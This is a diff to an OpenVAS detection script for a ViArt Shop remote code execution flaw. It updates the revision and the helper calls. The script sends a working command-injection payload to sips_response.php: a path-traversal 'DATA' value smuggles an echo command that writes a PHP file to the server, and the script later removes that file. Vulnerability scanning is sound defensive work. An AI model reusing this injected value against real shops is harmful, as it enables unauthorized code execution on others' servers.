@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_viart_shop_rce_2012_09.nasl 11066 2018-08-21 10:57:20Z asteins $
+# $Id: gb_viart_shop_rce_2012_09.nasl 11435 2018-09-17 13:44:25Z cfischer $
 #
 # ViArt Shop Remote Code Execution Vulnerability
 #
@@ -27,10 +27,10 @@
 
 CPE = "cpe:/a:viart:viart_shop";
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103578");
-  script_version("$Revision: 11066 $");
+  script_version("$Revision: 11435 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
   script_name("ViArt Shop Remote Code Execution Vulnerability");
@@ -38,7 +38,7 @@ if (description)
   script_xref(name:"URL", value:"http://www.viart.com/downloads/sips_response.zip");
   script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5109.php");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-08-21 12:57:20 +0200 (Tue, 21 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 15:44:25 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-09-26 10:51:47 +0200 (Wed, 26 Sep 2012)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -57,12 +57,14 @@ data. This can be exploited to execute arbitrary commands via specially
 crafted requests.");
 
   script_tag(name:"affected", value:"Affected version: 4.1, 4.0.8, 4.0.5");
+
   exit(0);
 }
 
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 if(!port = get_app_port(cpe:CPE))exit(0);
 if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
@@ -72,7 +74,7 @@ function exploit(ex) {
   url = dir + '/payments/sips_response.php';
   len = strlen(ex);
 
-  host = get_host_name();
+  host = http_host_name(port:port);
 
   req = string("POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
@@ -80,7 +82,6 @@ function exploit(ex) {
                "Content-Length: ",len,"\r\n",
                "\r\n",
                ex);
-
   result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
   url = dir + '/payments/' + file;
@@ -88,22 +89,17 @@ function exploit(ex) {
   buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
   if("<title>phpinfo()" >< buf) {
-
     ex = "DATA=..%2F..%2F..%2F..%2F..%2F;echo '' > ./" + file; # clean up...
     exploit(ex:ex);
-
     security_message(port:port);
     exit(0);
-
   }
-
-
 }
 
-file = 'openvas_' + rand() + '.php';
+vtstring = get_vt_string( lowercase:TRUE );
+file = vtstring + '_' + rand() + '.php';
 ex = "DATA=..%2F..%2F..%2F..%2F..%2F;echo '<?php phpinfo(); ?>' > ./" + file;
 
 exploit(ex:ex);
 
 exit(0);
-
